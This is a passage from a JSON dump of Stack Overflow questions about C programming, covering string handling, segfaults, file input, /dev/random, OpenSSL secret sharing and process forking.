Linux?</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":63,"score":2,"question_id":13189747,"title":"return value is not displayed if printf in the other method is commented","body":"<p>It seems that something weird is happening in my code below. When any of the printf in the nthtoken() is commented, no token is displayed in main(), but when any of the nthtoken()'s printf is uncommented, token is displayed in main.</p>\n\n<pre><code> #include &lt;stdio.h&gt;\n #include &lt;stdlib.h&gt;\n #include &lt;string.h&gt;\n\n char *nthtoken (char *origStr, char *delimiters, int nth);\n\n int main (void) {\n\n      char *str = \"in principio creavit deus caelum et terram\";\n      char *delims = \" \";\n\n      char *tok = nthtoken (str, delims, 3);\n      printf (\"token: %s\\n\", tok);\n\n      return (EXIT_SUCCESS);\n }\n\n char *nthtoken (char *origStr, char *delimiters, int nth) {\n\n      char str[strlen (origStr)];\n      strncpy (str, origStr, strlen (origStr) + 1);\n\n      char *token = NULL;\n      token = strtok (str, delimiters);\n      // printf (\"first token: %s\\n\", token);\n\n      int i = 0;\n      for (i = 0; i &lt; nth; i++) {\n           token = strtok (NULL, delimiters);\n           //printf (\"token inside the loop: %s\\n\", token); \n      }\n      // printf (\"token before returning to main(): %s\\n\", token);\n      return token;\n }\n</code></pre>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":39,"score":1,"question_id":13189372,"title":"Why doesn't my removeWhitespace function work?","body":"<p>I get a segment fault error at the line that contains:</p>\n\n<pre><code>*pointer++ = *pointer_2++\n</code></pre>\n\n<p>Not sure why.</p>\n\n<p>String is declared as so(inside my main):</p>\n\n<pre><code>char *str = \"Why doesn't this function work?\"\n</code></pre>\n\n<p>And this is my function:</p>\n\n<pre><code>void removewhitespace(char *str)\n{\n        // remove whitespace from the string.                                   \n  char *pointer = str;\n  char *pointer_2 = str;\n do{\n\n    while (*pointer_2 == ' ' || *pointer_2 == '\\n' || *pointer_2 == '\\t')\n      pointer_2++;\n\n  }while (*pointer++ = *pointer_2++);\n\n}\n</code></pre>\n"},{"tags":["c#","c","gui"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":78,"score":0,"question_id":13192900,"title":"C# GUI for a C program","body":"<p>Im writing a program that manipulates files in C/C++, And I want to wrap it with a nice GUI made in C#.\nIs there a way to mix the C# gui with the C program? If there are multiple, what is the best way? (I tought about communicating with named pipes between both, but it seems a bit messy).\nWould it be possible to create the GUI with something like Unity, or should I use a library like XNA for it? (The GUI has to be \"Fancy\", something like Steam, or the Xbox dashboard, for instance).</p>\n"},{"tags":["c","input","parameters","command","line"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":52,"score":3,"question_id":13192655,"title":"command line argument and file input C","body":"<p>I don't really know how to ask this...</p>\n\n<p>Supposed I want to read a file from my function, but I have no idea what will be the filename that I want to read because the filename will be passed in my main function as command line argument (argv[])</p>\n\n<p>so my main looks like :</p>\n\n<pre><code>int main(int argc, char *argv[])\n</code></pre>\n\n<p>my function will look like:</p>\n\n<pre><code>int get_corners(FILE *input, int size, and so on)\n</code></pre>\n\n<p>What I've tried in my function:</p>\n\n<pre><code>*input = fopen(argv[1], \"r\");\n</code></pre>\n\n<p>but, compiler said it doesn't recognize variable argv</p>\n\n<p>So, can someone please help me understand how to call input file when you are not in main and have to deal with command line parameter?</p>\n\n<p>Thank you</p>\n"},{"tags":["c","file-io","fgets"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":13191667,"title":"Reading from a configuration file","body":"<p>I'm working on reading a path from a simple configuration file and store it in to a char array using C language. I came up with a way to do that but have a problem with retrieving the path without white spaces attached the end of it. Please help me to find a better way of doing this. </p>\n\n<pre><code>char* webroot(){\n FILE *in = fopen(\"conf\", \"rt\");\n char buff[1000];\n fgets(buff, 1000, in);\n printf(\"first line of \\\"conf\\\": %s\\n\", buff);\n fclose(in);\n\n return buff;\n}\n</code></pre>\n"},{"tags":["c","linux"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":4,"view_count":77,"score":-1,"question_id":13192845,"title":"New to C, need help in understanding below function","body":"<pre><code>case 1:\n    if (fork())\n        wait(0);\n    else\n        execlp(\"ls\", \"ls\", (char *)NULL);\n    break;\n</code></pre>\n\n<p>I had been told to make a user interface Textual display Menu in C that was previously made with the help of a Shell script. I have gone through the ncurses library but if some one can direct me to code that was previously implemented using ncurses for a menu in C for Linux, I would be grateful.</p>\n"},{"tags":["c","string","ternary"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":142,"score":-2,"question_id":12709833,"title":"Contiguous substrings containing one or two characters odf a given Ternary string","body":"<p>One question for an Interview was that : given a ternary string , find the number of contiguous substrings which contain only one or two character of the given ternary string. A ternary string is one which is made up of at most 3 characters. Like for ex: bcabb is a ternary string over the set {a,b,c}.\nAns to the above example will be: b,c,a,b,b,bc,ca,ab,bb ie.,9.</p>\n\n<p>Note: substrings are decided by there start and end index not uniqueness.</p>\n\n<p>Can anyone tell me what algo to follow in this question.</p>\n"},{"tags":["c++","c","function","pointers","typechecking"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":185,"score":0,"question_id":13067227,"title":"Type of Function in C or C++","body":"<p>I have a simple question:</p>\n\n<blockquote>\n  <p>What is the type of function in C or C++   </p>\n</blockquote>\n\n<p>As we can have pointers to function in C or C++, that means functions should have a specific type otherwise type checking during pointers to function creation have no meaning.</p>\n\n<p>Can someone explain me, I am on the correct path or not?   </p>\n\n<p>If I am on the right path, How can I find the type of function?</p>\n"},{"tags":["c","eclipse","i2c"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":18,"score":1,"question_id":13192595,"title":"Multiple markers at this line - Syntax error (eclipse)","body":"<p>i create a header file for i2c, the origin from Peter Fleury. i rewrite in eclipse and get error warning \"Multiple markers at this line - Syntax error - expected identifier or '(' before 'unsigned'\" in second line of list program below</p>\n\n<pre><code>&gt;#define    i2c_read(ack)   (ack) ? i2c_readAck() : i2c_readNak();\n&gt;\n&gt;unsigned char  i2c_read (unsigned char ack);\n</code></pre>\n\n<p>anybody can help me?</p>\n"},{"tags":["c++","c","performance","algorithm","io"],"answer_count":0,"favorite_count":0,"up_vote_count":3,"down_vote_count":9,"view_count":175,"score":-6,"question_id":13192537,"title":"fastest method to print output in c/c++","body":"<p>My program generates a lot of integers(about 300000) to be output on the screen. Each integer needs to be printed on a separate line. Traditional output methods using printf for each line or sprintf to a buffer and then printf the buffer take huge time. I want to print my result within 3 seconds.</p>\n\n<p>Please suggest some faster ways</p>\n"},{"tags":["c","arrays","static","initialization"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13192427,"title":"ideal data type for an array in C, level 2","body":"<p>Now that <a href=\"http://stackoverflow.com/questions/13162733/ideal-data-type-for-an-array-in-c\">I found a way</a> to statically initialize my array of items, I need a more complexe structure and instead of a char* as a value, I need a struct (named atom_s).</p>\n\n<pre><code>typdef struct atom_s {\n  const char *val;\n  const char *filter;\n} atom_t;\n\nstruct\n{\n  const char *key;\n  const atom_t **values;\n} key_to_values[] =\n{\n  { .key = \"foo\", .values = (const atom_t *[]) { NULL } },\n  { .key = \"bar\", .values = (const atom_t *[]) { { .val = \"foo\", .filter = \"bar\" }, NULL } },\n};\n</code></pre>\n\n<p>The problem is: I don't know how to initialize an atom_s inside the array declaration above or if it is even possible.\nThe second line of the array (with key = \"bar\") does not compile:</p>\n\n<pre><code>warning: braces around scalar initializer  \nwarning: (near initialization for '(anonymous)[0]')\nerror: field name not in record or union initializer\n</code></pre>\n"},{"tags":["c","xml","xml-parsing","key"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":40,"score":-4,"question_id":13179895,"title":"Extract XML data in a C variable","body":"<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\" ?&gt;&lt;Auth uid=\"\" tid=\"public\" ac=\"\" sa=\"\" ver=\"1.5\" lk=\"\"&gt;\n&lt;Skey ci=\"\"&gt;\nelkhqweoiruqhweprqwepoiuqwheporiqhweprokqwjerpoqiwehrpqowkejhrpqoweihrpqowerhqpoweirhqpoweihrpqoewihrpqoiewhrpqoiewhrpqowiehroqpihwerpoqihweropqiwehrqopirhpoqiwehrqo/7dUd1n3/hD88nDe49B8KBTtV/Gcf1xZWuVbKlNeIqyM\n&lt;/Skey&gt;\n&lt;Uses pi=\"n\" pa=\"n\" pfa=\"n\" bio=\"y\" bt=\"n\" pin=\"n\" otp=\"n\" /&gt;\n&lt;Data&gt;\nepryqpweoryqwjfhqwpeurhqpweohqpweouiyhqpwoehqpwejrhqpowieurhqpwejhrqpwuehqpwuoerqpwerhqpewurhqpwoeruhqeprouqhwperouqwheroqhwe19823yqweuhrpqwehrqpowerh1902834hrpqwerhpqowjrhqwpoerhqpwoerhqpowerqpowerhqpowerpquwehrpquwehrqpwehrpqoerqpweorhqpwoerhqpwoerhqpowerhqoqweprqpweorihp123001+/2301qwekrjqwerqewrqewrqwerqew\n&lt;/Data&gt;\n&lt;Hmac&gt;\nqwerqwer+qewrq;oweirqowerqwerqwerqweqwepjropijhqoiwheoiruqwpoergyqpiowuerhqpwejrhqwoieurqhwer\n&lt;/Hmac&gt;\n&lt;Signature /&gt;&lt;/Auth&gt;\n</code></pre>\n\n<p>This doesn't come in a separate file, but in a variable. I need to extract out the data between the following tags in the variable.</p>\n\n<p>--> Skey</p>\n\n<p>--> ci (comes inside 'Skey' tag)</p>\n\n<p>--> Hmac</p>\n\n<p>--> ac, sa, lk  ( Comes inside 'Auth' tag)</p>\n\n<p>Need to do this using a C program.</p>\n"},{"tags":["c++","c","arrays","string"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":4,"view_count":81,"score":-2,"question_id":13184546,"title":"How do I read an array of strings from console input?","body":"<p>I have written a code to accept 100 strings of varying length from user(i need to do it using standard input/output)this code is not showing any error,but when i execute it,it is not even accepting the strings and return back to my program. here is the code,</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\ntypedef char *string;\nint main(int argc ,char *argv[])\n{\n    string s[100][100];\n    string a[100];\n    int n=0;\n    printf(\"Enter the num of strings you wanna add\");\n    scanf(\"%d\",n);\n    for(int i=0;i&lt;n;i++)\n    {\n        for(int j=0;j&lt;100;j++)\n        {\n\n            scanf(\"%c\",a[j]);\n            s[i][j]=a[j];\n            if(a[j]==' ')\n                break;\n        }\n    }\n    for(int i=0;i&lt;n;i++)\n    {\n        for(int j=0;j&lt;100;j++)\n        {\n\n            printf(\"%c\",s[i][j]);\n        }\n    }\n}\n</code></pre>\n"},{"tags":["c++","c","data"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":96,"score":1,"question_id":13172255,"title":"What is the efficient method to compare files list in Client and remote Server","body":"<p>I have the below situation which need to be addressed efficiently,</p>\n\n<p>I'm doing file sync from client devices to server. Sometimes what happen is file from one device doesn't get fetched to another device from the server due to some issues with server. I need to make sure that all the files in the server are synced to all the client devices using a separate thread. I am using C++ for the development and libcurl for client to server communication.</p>\n\n<p>Here in the client device, we have an entry for downloaded files in the SQLite Database. Likewise in the server, we have similar updates in the server databases (MySQL) too. I need to list all the available files from the client device and send it to server and have to compare it with the list taken from the server database to find out the missed files.</p>\n\n<p>I did a rough estimation that for 1 million files list (File Name with Full Path), it is about 85 MB in size. Upon compression it goes upto 10 MB in size. So transferring this entire file list (even after compression) from client to server is not a good idea. I planned to implement Bloom Filters for this as belows,</p>\n\n<ol>\n<li>Fetch files list from client side database and convert those to Bloom Filter Data Structure.</li>\n<li>Just transferring the bloom data structure alone from client to the server.</li>\n<li>Fetch files list from server side database and compare it with Bloom data structure received from the client and find out the missing files.</li>\n</ol>\n\n<p>Please note that the above process initiated from client should be handled in thread at regular interval say for every 1 hour or so.</p>\n\n<p>The problem with Bloom filters is false positive rates even if it very low. I don't want to miss out even a single file. Is there any other better way of doing this ?. </p>\n\n<p>thanks\nprabu</p>\n"},{"tags":["c","linux","unix","random","entropy"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":66,"score":1,"question_id":13190562,"title":"/dev/random does not block","body":"<p>I am trying to gather true random numbers from /dev/random. Here is my simple code:</p>\n\n<pre><code>u_char buf[256];\n\nmemset(buf, 0, 256);\n\nint dev = open(\"/dev/random\", O_RDONLY);\n\nint nbr = read(dev, buf, 100);\n\nprintf(\"Number of bytes returned : %d\\n\", nbr);\n</code></pre>\n\n<p>As you can see that i am asking for 100 random bytes but when i run this program i always get output in variable <em>nbr</em> in range of 15 to 30 which is understandable as /dev/random does not always have enough entropy but my expectation was that upon read(), /dev/random should block until it fills my buffer to 100 random bytes which does not occur in this case and program does not block. I read man pages for /dev/random. It says that </p>\n\n<blockquote>\n  <p>When the entropy pool is <strong>empty</strong>, reads from /dev/random will block\n  until additional environmental noise is gathered.</p>\n</blockquote>\n\n<p>Does this literally mean that /dev/random will only block when entropy pool is <strong>empty</strong> and will not block when it has any amount data whether or not it is less than the required bytes?</p>\n\n<p>Any help would be appreciated.</p>\n"},{"tags":["c","eclipse","opencv"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13191636,"title":"OpenCV242 on eclipse in windows","body":"<p>I want to work with OpenCV2.4.2 . and I tried  a simple progam to test if it'll work  here is the code : </p>\n\n<pre><code>#include \"stdlib.h\"\n#include \"stdio.h\"\n#include \"math.h\"\n#include \"cv.h\"\n#include \"highgui.h\"\nint main(int argc, char *argv[])\n{\n// Nothing but create a window\n  cvNamedWindow(\"mainWin\", CV_WINDOW_AUTOSIZE);\n  cvMoveWindow(\"mainWin\", 100, 100);\n  cvWaitKey(0);\n  return 0;\n}\n</code></pre>\n\n<p>wenn I try to build and run this I get this error message from Eclipse :</p>\n\n<pre><code>fatal error: opencv2/core/core_c.h: No such file or directory\nline 63, external location:      D:\\opencv\\include\\opencv\\cv.h C/C++ Problem\n\n\n\n\nSymbol 'CV_WINDOW_AUTOSIZE' could not be resolved   source.c    line 18 Semantic Error\n</code></pre>\n\n<p>Any Idea why it doesn't work ??  </p>\n"},{"tags":["c","arrays","function","macros"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":56,"score":0,"question_id":13191181,"title":"Assigning an array to a function macro","body":"<p>I recently came across the below code where macro is defined as below</p>\n\n<pre><code>unsigned char cbuf[10];\n#define pbuf() (&amp;cbuf[0])\n</code></pre>\n\n<p>Can anyone please explain what is being done in the <code>#define</code>(macro definition) line?</p>\n"},{"tags":["c","openssl","shared-secret"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13189544,"title":"OpenSSL implementation of Shamir Secret Sharing","body":"<p>I'm attempting to implement Shamir Secret Sharing using OpenSSL.  I'm having a lot of trouble getting the message to decrypt!  </p>\n\n<p>I have tried several implementations for decryption, both this one: \n<a href=\"http://www.cs.cornell.edu/courses/cs754/2001fa/307.pdf\" rel=\"nofollow\">http://www.cs.cornell.edu/courses/cs754/2001fa/307.pdf</a></p>\n\n<p>And this one (which references the paper above, but uses a different method):</p>\n\n<p><img src=\"http://i.stack.imgur.com/osSsP.jpg\" alt=\"http://i9.photobucket.com/albums/a60/cacollo/confused1.jpg\"> (Note i am aware of the typo for calculating <code>u2</code>)</p>\n\n<p>I believe my problem might be a loss of precision when doing the Lagrange Interpolation on ik/(ik-ij) using BIGNUM values to represent the key numbers.  I wrote a small function that converts an <code>int</code> like a key number to a BIGNUM value.</p>\n\n<p>I'll spare you my key generating code because i'm pretty certain that's working correctly.  The following is my implementation of the JPEG that i linked (not the PDF):</p>\n\n<pre><code>int i;\nfor (i = 0; i &lt; 3; i++) {\n    aij[i] = BN_new();\n    BN_mod_exp(aij[i], c.c1, key[i].key, p, ctx);\n}\n\n\nBIGNUM *ik = BN_new();\nBIGNUM *ij = BN_new();\nBIGNUM *denomTmp = BN_new();\nBIGNUM *numTmp = BN_new();\nBIGNUM *divTmp = BN_new();\nBIGNUM *accum = BN_new();\n\nint j, k;\n\n/* Lagrange Interpolation */\nfor (j = 0; j &lt; 3; j++) {\n    BN_one(accum);\n    for (k = 0; k &lt; 3; k++) {\n        if(j == k) continue;\n        else {\n            ik = int2BN(key[k].keynum); //int2BN is my function for converting ints to BNs\n            ij = int2BN(key[j].keynum);\n\n            BN_sub(denomTmp, ik, ij);\n\n            BN_div(divTmp, NULL, ik, denomTmp, ctx);\n            BN_mul(accum, accum, divTmp, ctx);\n        }\n    }\n    cij[j] = BN_new();\n    BN_mod(cij[j], accum, q, ctx); // accum % q = cij[j]\n}\n\n// Now for the second half...\nint a;\nu1 = BN_new();\nBIGNUM *u1tmp = BN_new();\nBN_one(u1);\nfor (a = 0; a &lt; 3; a++) {\n    BN_mod_exp(u1tmp, aij[a], cij[a], p, ctx);\n    BN_mod_mul(u1, u1, u1tmp, p, ctx);\n}\n</code></pre>\n\n<p>When i spit out the calculated values in cij[], i'm getting: 2, -5, 0 when using keys [2, 4, 5].  According to some math i did by hand it should actually be 10/3, 5, and 8/3.  Is there any way to get around this?  </p>\n\n<p>Are there other problems with my code that you see?  Thanks in advance.</p>\n"},{"tags":["c","gcc"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":58,"score":3,"question_id":13187629,"title":"gcc intrinsic for extended division/multiplication","body":"<p>Modern CPU's can perform extended multiplication between two native-size words and store the low and high result in separate registers. Similarly, when performing division, they store the quotient and the remainder in two different registers instead of discarding the unwanted part.</p>\n\n<p>Is there some sort of portable gcc intrinsic which would take the following signature:</p>\n\n<pre><code>void extmul(size_t a, size_t b, size_t *lo, size_t *hi);\n</code></pre>\n\n<p>Or something like that, and for division:</p>\n\n<pre><code>void extdiv(size_t a, size_t b, size_t *q, size_t *r);\n</code></pre>\n\n<p>I know I could do it myself with inline assembly and shoehorn portability into it by throwing #ifdef's in the code, or I could emulate the multiplication part using partial sums (which would be significantly slower) but I would like to avoid that for readability. Surely there exists some built-in function to do this?</p>\n"},{"tags":["c","string"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":70,"score":-3,"question_id":13185745,"title":"Interview street hyper string :solved by passing only first test case","body":"<p>I was attempting \"hyper string problem\" in interview street,although my code passes the first test case,it is failed to pass all other 9 cases.They ask to output the result in modulo of 10000007,but when i do that,even it fails to pass the first case.whats wrong in my program??\nTHE INTERVIEW QUESTION IS:\nString A is called \"Super String\" if and only if:</p>\n\n<p>A contains only letters a, b, c, d, e, f, g, h, i and j;\nFor any i,j A[i] has lower ascii code than A[j] where 0 &lt;= i &lt; j &lt; length(A)\nGiven a set of Super Strings H, a Hyper String is a string that can be constructed by concatenation of some Super Strings of the set H. We can use each Super String as many times as we want.</p>\n\n<p>You are given the set H, you have to compute the number of Hyper Strings with length no more than M.</p>\n\n<p>Input:</p>\n\n<p>First line of input contains 2 integers, N ( the number of Super Strings in H ) and M \nNext N lines describe the Super Strings in set H.\nN and M are no more than 100.</p>\n\n<p>Output:</p>\n\n<p>Output an integer which is the number of possible Hyper Strings that can be derived. Since it may not fit in 32bit integer, print the output module 1000000007. (i.e answer = answer % 1000000007)</p>\n\n<p>Sample Input</p>\n\n<p>2 3\na\nab</p>\n\n<p>Sample Output</p>\n\n<p>7</p>\n\n<p>Explanation</p>\n\n<p>In the first example all the Hyper Strings are : \"\" (a string with no characters), \"a\", \"ab\", \"aa\", \"aaa\", \"aba\", \"aab\".</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\n#include&lt;stdlib.h&gt;\n\nvoid main()\n{\n  char *s[ 100 ];\n  char c[100];\n  int len[100];\n  int i,k,n,m,j,count=0;\n  scanf(\"%d\",&amp;n);\n  scanf(\"%d\",&amp;m);\n  for (i = 0; i &lt;= n; i++)\n  {\n    if(fgets( c, 100, stdin ) != NULL)\n     {\n         s[ i ] = malloc( strlen( c ) );\n         strcpy(s[ i ],c );\n     }\n\n  }   \n  for(i=0;i&lt;n;i++)\n  {\n   len[i] = strlen(s[i]);\n  }\n  for(i = 0 ;i &lt; n; i++)\n  {\n     for(k = 1;k != m; k++)\n    {\n       if(k*len[i]&lt;=m)\n       count++;\n    }\n     for(j=0;j&lt;n;j++)\n       {\n\n       if((len[i]+len[j])&lt;=m)\n       count++;\n       }\n  }\n   printf(\"%d\",++count);\n }\n</code></pre>\n"},{"tags":["c++","c","visual-studio-2010","visual-c++","auto-update"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":13174519,"title":"How can I make an automatic updater for my visual studio 2010 c++ application?","body":"<p>How can I make an automatic updater for my visual studio 2010 c++ application ? I do not want any kind of advanced features. \nAny free application that can provide a notification that \"A new version 1.2.2 is available\" ?</p>\n\n<p>Actually right now I just want only notification to the user not download the software or something like that. </p>\n\n<p>When a user run the application then simple check the new version, if available then a message box or notification appears.</p>\n\n<p>My idea is that the application simple check a \"http://www.site.com/update.txt\" file which has a number if number increment in future, then msg box appears that \"a new version is available, Visit website\" .. its simple but how can I check in VS2010 C++ ?</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":13177177,"title":"C: syntax error reading a file","body":"<p>I'm experiencing an error trying to run some C code on a set of data.<br> \nThe error message that appears is: </p>\n\n<blockquote>\n  <p>\"Analyzing line: 64ERROR: syntax error at position 15!\"</p>\n</blockquote>\n\n<p>The C code displaying this type of message is the following:</p>\n\n<pre><code>/* Returns 0 - no error / 1 - missing number / 2 - invalid number */\nerr = GetPositiveFloat(line, &amp;pos, &amp;f);\nif (err == 1) f = 1;\nif (err == 2) PUT_ERROR(11, (\"ERROR: syntax error at position %d!\", pos))\nelse\n//...\n</code></pre>\n\n<p>I really don't know what this error means in order to manage it and I'm totally new to the C language. Can anyone help me understand what's happening?</p>\n"},{"tags":["c","integer","ascii"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":56,"score":-1,"question_id":12868214,"title":"Converting an \"ASCII decimal\" to an integer in C","body":"<p>I am trying to convert an \"ASCII decimal\" to an integer. The \"ASCII decimal\" can be up to 10 digits long and is padded with spaces if there are no more digits (ie <code>36________</code>, where the \"_\" is actually space). I am really new to C (I just started learning last week) and I have absolutely no clue how to do so.</p>\n\n<p>For example:</p>\n\n<pre><code>int main(int argc, char *argv[])\n{\n    int fda = open(argv[2], O_RDONLY);\n    char arSize[10];\n    read(fd, arSize, 10);\n    //convert arSize to an int and store in i\n    lseek(archive, i, SEEK_CUR);\n}\n</code></pre>\n"},{"tags":["c","assembly","arm"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":13181145,"title":"Using global variables declared in C, in Arm assembly","body":"<p>So I have a C file that declared a few global variables. This file will be compiled together with a bunch of ARM assembly files. How can I use these global variables in assembly?</p>\n\n<p>Can I simply do something like:</p>\n\n<pre><code>...\nLDR    r0, =GLOBAL_VAR\n...\n</code></pre>\n\n<p>Thank you.</p>\n\n<p>I tried using the following link:</p>\n\n<p><a href=\"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0203j/Cihcciij.html\" rel=\"nofollow\">http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0203j/Cihcciij.html</a></p>\n\n<p>but its telling me that \"import\" is an undefined instruction.</p>\n\n<p>Also, I'm using arm-linux-gcc cross compiler, and pxa270 processor.</p>\n"},{"tags":["c","string"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":165,"score":1,"question_id":11538381,"title":"Reverse strings in C","body":"<p>What's the problem with the following code?</p>\n\n<pre><code>#define N 30\nint main() {\n    char str[N], new_str[N];\n    int i,len;\n    printf(\"Please enter 20 letters. \\n\");\n    scanf(\"%s\", str);\n    len = strlen(str);\n    printf(\"The length of str is  %d \", len);\n    for (i=0; i&lt; len; i++)\n        new_str[i]=str[len-1-i];\n    printf(\"The result is: %s\\n\", new_str);\n    return 1;\n}\n</code></pre>\n\n<p>I checked that for every string under 16 characters the program is OK, and above it returns undefined characters at the end:</p>\n\n<pre><code>  Please enter 20 letters.\n  1234567891111111\n\n  The result is: 1111111987654321q=V?.\n</code></pre>\n\n<p>However, if I initialize <code>str, new_str</code> with \"\" the problem is solved. I still I wonder what causes the problem.</p>\n"},{"tags":["c","loops","do-while"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":13188906,"title":"Can a section of the code be interfering with the loop?","body":"<p>I'm coding a calculator in C that does basic arithmetic and can loop until the user imput a command otherwise. I thought I was getting the hang of loops, but I only put one loop (to start a new operation) and it isn't working. Can a section of the code be interfering with the loop? Is the syntax wrong? The program works fine otherwise.</p>\n\n<pre><code>int main(int argc, char *argv[])\n{\n    char reponse;\n\n    int oper;\n    float nb1, nb2, resultat;\n\n    do\n    {\n        printf(\"Entrez les deux valeurs que vous voulez calculer: \\n\");\n        scanf(\"%f %f\", &amp;nb1, &amp;nb2);\n\n        printf(\"\\nValidez votre op\\x82rateur pour effectuer votre cacul\\n\");\n        printf(\"choisissez \\\"1\\\" pour une addition, \\\"2\\\" pour une soustraction,\\n\");\n        printf(\"\\\"3\\\" pour une multiplication ou \\\"4\\\" pour une division\\n\");\n        scanf(\" %d\", &amp;oper);\n\n        switch(oper )\n        {\n            case 1:\n                resultat = nb1 + nb2;\n                printf(\"\\n%.2f + %.2f = %.2f\\n\", nb1, nb2, resultat);\n                break;\n            case 2:\n                resultat = nb1 - nb2;\n                printf(\"\\n%.2f - %.2f = %.2f\\n\", nb1, nb2, resultat);\n                break;\n            case 3: resultat = nb1 * nb2;\n                printf(\"\\n%.2f * %.2f = %.2f\\n\", nb1, nb2, resultat);\n                break;\n            case 4: resultat = nb1 / nb2;\n                printf(\"\\n%.2f / %.2f = %.2f\\n\", nb1, nb2, resultat);\n                break;\n            default:\n                printf(\"\\nErreur\\n\");\n        }\n\n        printf(\"\\nVoulez-vous continuer \\x85 faire des op\\x82rations? [o/n]\\n\");\n        scanf(\" c%\", &amp;reponse);\n    } while (reponse == 'o' || reponse == 'O');\n\n\n    printf(\"\\nMerci au revoir ! Appuyez sur une touche quelconque pour terminer\");\n    getch();\n}\n</code></pre>\n"},{"tags":["c++","c","linux","windows","cross-compiling"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":13190444,"title":"Queries on Cross compiling, from Windows to Linux and from Linux to Windows,","body":"<p>I am working on a C, project which uses <code>ffmpeg</code> library.\nCurrently I'm working on <em>windows</em> platform, and I'll be cross compiling the project for <em>Linux ARM</em>.\nWith that background, I have few basic questions.</p>\n\n<ol>\n<li><p>If I use <em>ANSI C++</em>, I can be sure that, I'll be able to cross compile the project using corresponding compilers <code>[ MSVC, MingW ]</code></p>\n\n<p>But ..</p></li>\n<li><p>If I'm using \"Win32\" and other \"Windows\" specific APIs in my project, how does the cross compiler will handle it, to make the project able to run on Linux.</p></li>\n<li>Similarly, If I'm using Linux specific \"features\" in my project, how does the cross compiler will handle it, to make the project able to run on Windows.</li>\n</ol>\n"},{"tags":["c","linux","debugging","linux-kernel"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":13189576,"title":"Getting linux kernel debug information after kernel crash","body":"<p>Is there any way to get kernel previous debug information after kernel chrash occurs.</p>\n\n<p>I am trying to develop a Kernel module which basically captures IP packets in ip layer inside kernel network stack &amp; after some modification i have to send the same packet back to the NIC for transmission. During all these processes i m writing debug information with the help of <strong>printk()</strong>. but if any thing goes wrong &amp; kernel failure occurs so we have to restart the system . So is there any way to get my previous debug info because after rebooting the debug info is not present as i try to get it by <strong>dmesg</strong> command.  </p>\n"},{"tags":["c++","c","linux","waitpid","wexitstatus"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":13182100,"title":"waitpid/wexitstatus returning 0 instead of correct return code","body":"<p>I have the helper function below, used to execute a command and get the return value on posix systems. I used to use <code>popen</code>, but it is impossible to get the return code of an application with <code>popen</code> if it runs and exits before <code>popen</code>/<code>pclose</code> gets a chance to do its work.</p>\n\n<p>The following helper function creates a process fork, uses <code>execvp</code> to run the desired external process, and then the parent uses <code>waitpid</code> to get the return code. I'm seeing odd cases where it's refusing to run.</p>\n\n<p>When called with <code>wait</code> = <code>true</code>, <code>waitpid</code> should return the exit code of the application no matter what. However, I'm seeing <code>stdout</code> output that specifies the return code should be non-zero, yet the return code is zero. Testing the external process in a regular shell, then <code>echo</code>ing <code>$?</code> returns non-zero, so it's not a problem w/ the external process not returning the right code. If it's of any help, the external process being run is <code>mount(8)</code> (yes, I know I can use <code>mount(2)</code> but that's besides the point).</p>\n\n<p>I apologize in advance for a code dump. Most of it is debugging/logging:</p>\n\n<pre><code>inline int ForkAndRun(const std::string &amp;command, const std::vector&lt;std::string&gt; &amp;args, bool wait = false, std::string *output = NULL)\n{\n    std::string debug;\n\n    std::vector&lt;char*&gt; argv;\n    for(size_t i = 0; i &lt; args.size(); ++i)\n    {\n        argv.push_back(const_cast&lt;char*&gt;(args[i].c_str()));\n        debug += \"\\\"\";\n        debug += args[i];\n        debug += \"\\\" \";\n    }\n    argv.push_back((char*)NULL);\n\n    neosmart::logger.Debug(\"Executing %s\", debug.c_str());\n\n    int pipefd[2];\n\n    if (pipe(pipefd) 